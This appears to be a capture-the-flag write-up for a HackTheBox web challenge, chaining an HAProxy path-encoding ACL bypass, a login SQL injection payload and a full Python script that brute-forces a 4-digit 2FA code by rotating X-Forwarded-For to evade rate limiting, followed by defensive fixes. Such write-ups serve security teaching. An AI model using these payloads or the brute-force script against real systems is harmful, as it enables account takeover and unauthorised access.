---
title: "No-Threshold"
date: 2027-12-20 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, haproxy, acl-bypass, url-encoding, sql-injection, rate-limit-bypass, x-forwarded-for, 2fa-brute-force, cwe-436, cwe-89, cwe-348, cwe-307]
description: "A medium Web challenge where HAProxy is the 'protective spell': a URL-encoded byte slips a raw path_beg deny while the backend url-decodes and routes it, a login SQL injection seeds a 4-digit 2FA code, and a rate limit keyed on the spoofable X-Forwarded-For header lets you brute all 10000 codes to reach the flag."
---

## Overview

`No-Threshold` is a medium HackTheBox **Web** challenge — a small Flask shop sitting
behind HAProxy, which the description calls a "specialized protective spell." The spell
is three HAProxy guards, and each one has a hole. The path to the flag chains a
reverse-proxy ACL bypass, a [SQL injection](https://cwe.mitre.org/data/definitions/89.html)
in the login, and a rate limit that turns out to be no rate limit at all — hence the name.

## The technique

HAProxy adds three protections in front of the app:

```
# guard 1 — external users can't reach the login at all
http-request deny if { path_beg /auth/login }

# guard 2 — verify-2fa requires a single valid IPv4 in X-Forwarded-For
acl valid_ipv4 req.hdr(X-Forwarded-For) -m reg ^(...ipv4...)$
http-request deny deny_status 400 if is_auth_verify_2fa !valid_ipv4

# guard 3 — max 20 verify-2fa requests / 60s, keyed on the XFF header value
stick-table type ip size 100k expire 60s store http_req_rate(60s)
http-request track-sc0 hdr(X-Forwarded-For) if is_auth_verify_2fa
http-request deny deny_status 429 if is_auth_verify_2fa { sc_http_req_rate(0) gt 20 }
```

The load-bearing mistake is that guard 1 matches the **raw** path (`path_beg /auth/login`),
while the verify-2fa ACL is written `path_beg,url_dec` — it URL-decodes first. That
inconsistency is an [interpretation conflict](https://cwe.mitre.org/data/definitions/436.html):
HAProxy and the backend disagree on what the path means. Percent-encode one byte of
`login` and HAProxy's raw match misses, while uWSGI/Flask still decode the path and route
it to the login handler.

Guard 3 is worse than it looks: the rate limit tracks requests by the **`X-Forwarded-For`
header value**, which the client fully controls. Send a fresh valid IPv4 in that header on
every request and each request lands in its own bucket — the 20/60s ceiling never trips.
That is [CWE-348](https://cwe.mitre.org/data/definitions/348.html) (reliance on a less
trusted source) enabling [CWE-307](https://cwe.mitre.org/data/definitions/307.html) — an
unthrottled brute force of the tiny 4-digit 2FA code.

## Solution

**Step 1 — bypass the `/auth/login` deny.** `l` is `%6c`:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://<host>:<port>/auth/login    # 403 (denied)
curl -s -o /dev/null -w "%{http_code}\n" http://<host>:<port>/auth/%6cogin  # 200 (routed to login)
```

A subtle trap: Python `requests`/`urllib3` silently re-decodes `%6c`→`l` before sending,
so the proxy re-blocks it. The path must be sent **verbatim** — via `curl`, `http.client`,
or a raw socket.

**Step 2 — SQL-inject past the login.** The query is built with raw string interpolation:

```python
query_db(f"SELECT username,password FROM users WHERE username='{username}' AND password='{password}'")
```

`username = admin'-- -` comments out the password check, authenticates, and seeds a global
4-digit 2FA code in the uwsgi cache.

**Step 3 — brute the 2FA with a rotating `X-Forwarded-For`.** 10000 possibilities, no
working throttle. The full solve is the durable artifact:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, http.client, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

host, port = sys.argv[1], int(sys.argv[2])
BASE = f"http://{host}:{port}"

def xff(i):
    return f"10.0.{i // 256}.{i % 256}"   # 10000 distinct valid IPv4s

# step 1+2: raw-path deny bypass + SQLi. http.client sends the path verbatim so
# HAProxy's raw path_beg /auth/login never matches; requests would re-decode it.
body = urllib.parse.urlencode({"username": "admin'-- -", "password": "x"})
conn = http.client.HTTPConnection(host, port, timeout=15)
conn.request("POST", "/auth/%6cogin", body,
             {"Content-Type": "application/x-www-form-urlencoded"})
r = conn.getresponse(); loc = r.getheader("Location", ""); r.read(); conn.close()
assert r.status == 302 and "verify-2fa" in loc, f"login/SQLi failed: {r.status} {loc}"
print("[+] SQLi login OK -> 2FA code seeded")

# step 3: brute the 4-digit code, one fresh XFF per request
found = {}
def attempt(i):
    if found: return None
    resp = requests.post(f"{BASE}/auth/verify-2fa",
                         data={"2fa-code": f"{i:04d}"},
                         headers={"X-Forwarded-For": xff(i)},
                         allow_redirects=False, timeout=15)
    return (f"{i:04d}", resp) if resp.status_code == 302 else None

with ThreadPoolExecutor(max_workers=24) as ex:
    futs = [ex.submit(attempt, i) for i in range(10000)]
    for f in as_completed(futs):
        res = f.result()
        if res:
            found["code"], found["resp"] = res
            break

print(f"[+] 2FA code brute-forced: {found['code']}")

# step 4: use the authenticated session cookie to read /dashboard
import re
d = requests.get(f"{BASE}/dashboard", cookies=found["resp"].cookies.get_dict(), timeout=15)
m = re.search(r"HTB\{[^}]+\}", d.text)
print("[+] FLAG:", m.group(0) if m else "(not found)")
```

Run it against a fresh instance:

```bash
python3 solve.py <host> <port>
# [+] SQLi login OK -> 2FA code seeded
# [+] 2FA code brute-forced: ****
# [+] FLAG: HTB{...}
```

The correct code sets `session["authenticated"] = True` and 302s to `/dashboard`, which
renders the flag.

## Why it worked

Every layer trusted something it shouldn't. HAProxy made a security decision on the raw
path while the app routed on the decoded one, so a single `%6c` was invisible to the
deny rule. The login concatenated user input straight into SQL. And the rate limit —
the whole point of the "protective spell" — counted requests per `X-Forwarded-For`, a
header the attacker sets freely, so a 4-digit secret with 10000 values was fully
exhaustible in seconds.

## Fix / defense

- **Normalize before deciding.** URL-decode (and reject encoded control bytes)
  consistently on *every* ACL, or enforce authorization in the application, not on a raw
  path regex at the edge. This kills the [CWE-436](https://cwe.mitre.org/data/definitions/436.html)
  interpretation conflict.
- **Key rate limits on the real peer address** (HAProxy `src`), never on a spoofable
  request header — otherwise it is a counter the attacker resets at will
  ([CWE-348](https://cwe.mitre.org/data/definitions/348.html)).
- **Parameterize the SQL** with bound placeholders ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)).
- **Make the 2FA code long and lock it to the account**, not just the source IP, with a
  hard per-account attempt cap ([CWE-307](https://cwe.mitre.org/data/definitions/307.html)).
